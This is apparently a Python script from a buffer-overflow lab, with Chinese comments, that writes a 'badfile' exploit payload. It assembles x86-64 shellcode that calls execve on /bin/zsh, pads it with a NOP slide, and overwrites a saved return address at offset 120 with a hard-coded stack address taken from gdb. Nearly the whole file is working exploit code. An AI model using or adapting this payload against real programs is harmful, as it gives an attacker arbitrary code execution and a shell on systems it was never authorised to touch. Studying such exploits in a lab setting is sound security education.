# 汇编助记符到机器码的转换可以使用在线工具或者查阅x86手册
shellcode = (
    "\x48\x31\xd2"                 # xorq %rdx, %rdx
    "\x52"                         # pushq %rdx
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x7a\x73\x68"  # movq %rax, '/bin/zsh'
    "\x50"                         # pushq %rax
    "\x48\x89\xe7"                 # 11100111 movq %rdi, %rsp
    "\x48\x31\xf6"                 # 11110110 xorq %rsi, %rsi
    "\x48\x31\xC0"                 # 01001000 + 00110001 + 11000000 xorq %rax, %rax
    "\xB0\x3B"                     # mov $59, %al
    "\x0f\x05"                     # syscall
).encode('latin-1')

# badfile 的大小（单位字节）
size = 320

# 我们用 0x90 即 nop 无操作指令来填充 shellcode 前面的内容，形成一个 nop slide
# 后续 ret 的地址只要落在 nop 就会自动往下执行到我们的 shellcode
content = bytearray(0x90 for _ in range(size))

# start 表示 shellcode 相对于 badfile(content) 的起始位置
start = size - len(shellcode)
content[start:] = shellcode
# 相对于 badfile(content) 的地址偏移量 bias 只要落在 0-start 之间就可以落在 nop slide 上
# 这里 bias 加上 160 是因为我们目前得到的地址信息是通过 gdb 调试得到的
# gdb 会在栈上额外添加一些内容，所以我们需要加上这个偏移量来确保地址指向的正确
# 偏移量应当是8的整数倍，因为当前实验环境是64位系统，即八个字节
# 经验：160-320 之间的偏移量通常是一个不错的选择
bias = start + 320

# address_array 是程序中「读取并存放了 badfile 的数组」的地址
address_array = 0x7fffffffd5b8
# ret 是 badfile 要跳转到的地址（跳转到我们精心设计好的区间）
ret = address_array + bias
content[112+8:112+8+8] = (ret).to_bytes(8, byteorder='little')

file = open("./output/badfile", "wb")
file.write(content)
file.close()
